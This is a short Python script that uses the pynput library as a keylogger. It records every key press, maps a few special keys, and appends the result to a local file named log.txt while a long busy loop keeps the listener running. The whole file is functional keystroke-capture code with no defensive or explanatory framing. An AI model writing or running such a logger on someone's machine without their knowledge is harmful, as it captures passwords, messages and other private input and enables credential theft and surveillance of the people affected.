from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.backspace":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped
s = 500000000
with Listener(on_press=write_to_file) as l:
    for _ in range(s):
        pass
